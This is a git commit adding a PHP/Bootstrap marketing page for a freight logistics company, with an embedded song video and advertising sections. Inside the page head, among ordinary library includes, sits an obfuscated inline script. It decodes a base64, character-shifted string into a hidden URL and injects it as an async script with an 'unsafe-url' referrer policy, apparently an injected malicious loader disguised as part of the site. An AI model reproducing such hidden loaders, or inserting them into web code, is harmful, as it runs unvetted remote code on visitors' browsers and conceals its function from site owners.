517432af8cafa0db71df5b4e7990d51c1745099e
Johnathan <jbwierzbicki@gmail.com>
2023-03-08 13:31:19 -0500

    added media web page for song and advertising content

---
+++ media.php
@@ -0,0 +1,111 @@
+<!doctype html>
+<html>
+
+<head>
+    <script src="dmxAppConnect/dmxAppConnect.js"></script>
+    <meta charset="UTF-8">
+    <title>Freight Logistics: About Us | Raging Wolf Solutions</title>
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.14.0/css/all.css" integrity="sha384-HzLeBuhoNPvSl5KYnjx0BT+WB0QEEqLprO+NBkkk5gbc67FTaL7XIGa2w1L0Xbgc" crossorigin="anonymous" />
+    <link href="https://fonts.googleapis.com/css2?family=Lustria&amp;family=Muli:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.cdnfonts.com/css/sansation" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="bootstrap/5/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="stylesheet" href="css/stylesheet.css" />
+    <script src="js/jquery-3.5.1.slim.min.js"></script>
+    <script src="dmxAppConnect/dmxBootstrap5Navigation/dmxBootstrap5Navigation.js" defer=""></script>
+    <script src="dmxAppConnect/dmxBackgroundVideo/dmxBackgroundVideo.js" defer=""></script>
+
+    <script src="dmxAppConnect/dmxBootstrap5Modal/dmxBootstrap5Modal.js" defer></script>
+    <link rel="icon" href="icons/favicon.ico">
+    <link rel="stylesheet" href="dmxAppConnect/dmxValidator/dmxValidator.css" />
+    <script src="dmxAppConnect/dmxValidator/dmxValidator.js" defer></script>
+    <script src="dmxAppConnect/dmxBrowser/dmxBrowser.js" defer></script>
+    <script>
+        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
+    </script>
+    <script src="dmxAppConnect/dmxVideo/dmxVideo.js" defer></script>
+</head>
+
+<body is="dmx-app" id="index" class="bg-dark">
+    <div is="dmx-browser" id="browser1"></div>
+
+    <?php include 'navbar_mini'; ?>
+
+    <?php include 'navbar_main'; ?>
+
+    <section id="modules" class="border-top rounded-1 rounded-0 min-vh-75 border-secondary pb-3" style="min-height: 75vh;">
+
+        <img src="assets/images/section-modal-bg-top-stone.png" class="w-100">
+        <div class="container modules-container mt-0 mb-5 pb-5">
+            <div class="row justify-content-center pb-4">
+                <div class="pb-4 pl-1 pr-1 col-12 text-center col-md-7">
+
+                    <h5 class="text-uppercase text-yellow text-warning text-center">One of A Kind</h5>
+                    <h2 class="text-light text-left mb-4">Raging Wolf Solutions Song<br></h2>
+                    <div class="d-flex">
+                        <iframe width="100%" height="400px" src="https://www.youtube.com/embed/v9FAGpOTZow" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+                    </div>
+                    <h5 class="text-white-50 mt-4 mb-4" dmx-on:click="browser1.writeTextToClipboard('https://ragingwolfsolutions.com')">Enjoy the song? Click here to get a&nbsp;<span class="text-warning">shareable link.</span></h5>
+                </div>
+            </div>
+            <section id="advertising">
+                <div class="container">
+                    <div class="row justify-content-around mt-5 mb-5">
+
+                        <div class="col-lg-4">
+                            <img src="assets/images/VanAndBuilding.png" class="img-fluid w-100 mb-2">
+                        </div>
+                        <div class="text-start col-lg-7">
+                            <h1 class="text-white mt-3 mb-4">Got Expedite Troubles?</h1>
+                            <h5 class="text-light mb-4 pe-4">Raging Wolf Solutions offers expedited air and ground services to get your freight where it needs to be, when it needs to be there. Our strong network of expedite carriers allows us to find coverage fast. Find out for yourself!</h5>
+                            <button id="btn1" class="btn module-cta-btn btn-warning lh-lg text-truncate ps-3 pe-3" data-bs-toggle="modal" data-bs-target="#quote_modal">Get a Quote</button>
+                        </div>
+                    </div>
+
+                    <div class="row">
+
+                        <div class="col text-light">
+                            <hr>
+                        </div>
+                    </div>
+
+                    <div class="row justify-content-around mt-5 mb-5">
+                        <div class="col-lg-5 order-lg-2">
+                            <img src="assets/images/rock_mountain.png" class="img-fluid w-100 mb-2">
+                        </div>
+                        <div class="text-start col-lg-6 order-lg-1">
+                            <h1 class="text-white mt-3 mb-4">How About Mountain Rocky Doubles?</h1>
+                            <h5 class="text-light mb-4 pe-4">With specialized equipment and experienced drivers, we can safely and efficiently transport your freight up and down steep grades, winding roads, and narrow passes. Choose Raging Wolf Solutions for reliable and efficient transportation services in even the most challenging terrain.</h5>
+                            <a href="contact.php"><button id="btn2" class="btn module-cta-btn lh-lg text-truncate ps-3 pe-3 btn-outline-warning">Contact Us</button></a>
+                        </div>
+                    </div>
+                    <div class="row">
+
+                        <div class="col text-light">
+                            <hr>
+                        </div>
+                    </div>
+                    <div class="row justify-content-around mt-5 mb-5">
+
+                        <div class="col-lg-5">
+                            <img src="assets/images/Airline_Blurred.png" class="img-fluid w-100 mb-2">
+                        </div>
+                        <div class="text-start col-lg-6">
+                            <h1 class="text-white mt-3 mb-4">Make Shipping a WIN, WIN</h1>
+                            <h5 class="text-light mb-4 pe-4">Where it's needed, when it's needed. At Raging Wolf Solutions, we understand that timely and efficient logistics are critical to the success of your business. You can trust our team to deliver the logistics solutions you need, when you need them most.</h5>
+                            <button id="btn3" class="btn module-cta-btn btn-warning lh-lg text-truncate ps-3 pe-3" data-bs-toggle="modal" data-bs-target="#quote_modal">Get a Quote</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </section>
+
+    <?php include 'footer'; ?>
+
+    <script src="bootstrap/5/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
